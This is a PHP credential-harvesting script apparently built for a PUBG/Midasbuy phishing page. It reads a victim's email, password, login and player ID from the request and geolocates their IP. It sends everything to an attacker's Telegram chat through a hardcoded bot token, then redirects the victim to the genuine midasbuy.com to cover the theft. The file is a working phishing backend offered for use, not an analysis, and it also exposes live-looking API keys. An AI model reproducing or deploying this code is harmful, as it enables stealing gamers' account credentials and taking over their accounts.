<?php
ob_start();
$API_KEY = '1931977814:AAEPptNkxjNiv8I-neIQj3BRlwOFp0oAyj0';
define('API_KEY',$API_KEY);
function bot($method,$datas=[]){
    $tbbots = http_build_query($datas);
        $url = "https://api.telegram.org/bot".API_KEY."/".$method."?$tbbots";
        $ttktt = file_get_contents($url);
        return json_decode($ttktt);
}
    if(!empty($_SERVER['HTTP_CLIENT_IP'])){
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    }elseif(!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    }else{
        $ip = $_SERVER['REMOTE_ADDR'];
    }
date_default_timezone_set('Africa/Cairo');
$time = date('h:i');
$year = date('Y');
$month = date('n');
$day = date('j');
$update = json_decode(file_get_contents('php://input'));
$message = $update->message;
$from_id = $message->from->id;
$chat_id = $message->chat->id;
$text = $message->text;
$name = $message->from->first_name;
$chat_id2 = $update->callback_query->message->chat->id;
$message_id = $update->callback_query->message->message_id;
$data = $update->callback_query->data;
$user = $message->from->username;

$admin = "831161538";
$email = $_GET["email"];
$password = $_GET["password"];
$playid = $_GET['playid'];
$login = $_GET["login"];
if($email){
$api = json_decode(file_get_contents("http://api.ipstack.com/".$ip."?access_key=46fe2d101482e11d5a51d0ab25ad277a"));
$country_name = $api->country_name;
$calling_code = $api->location->calling_code;
$url1 = "https://www.midasbuy.com";
header("location: $url1");
$name = $message->from->first_name;
bot("sendMessage",[
"chat_id"=>$admin,
"text"=>"
┍──━─━──┙𝙽𝙴𝚆 𝙰𝙲𝙲𝙾𝚄𝙽𝚃┕──━─━──┑
✎ ʟᴏɢɪɴ 》`$login`
✎ ᴇᴍᴀɪʟ 》`$email`
✎ ᴘᴀssᴡᴏʀᴅ 》`$password`
✎ 𝚃𝚑𝚎 𝙿𝚑𝚘𝚗𝚎 》`$phone`
✎ ᴘʟᴀʏᴇʀ ɪᴅ 》`$playid`
✎ ᴀᴄᴄ ʟᴇᴠᴇʟ 》$level
✎ 𝙸𝙿  》  $ip
✎ 𝙳𝙰𝚃𝙴  》$time
✎ ᴄᴏᴜɴᴛʀʏ ᴄᴏᴅᴇ 》`+$calling_code`
✎ ᴄᴏᴜɴᴛʀʏ ɴᴀᴍᴇ 》`$country_name`
✎ By :  》˹ @PHP505 ˼
┕─━─━──┑  @PHP505 ┍─━───━──┙
",
'parse_mode'=>"MarkDown",
'disable_web_page_preview'=>true,
]);
}
?>
<html>
  <head>
    <meta http-equiv="refresh" content="0; url='/index.php'" />
    <script type="text/javascript">
            window.location.href = "/index.php"
    </script>
 </head>
  <body>
  </body>
</html>
<?
?>
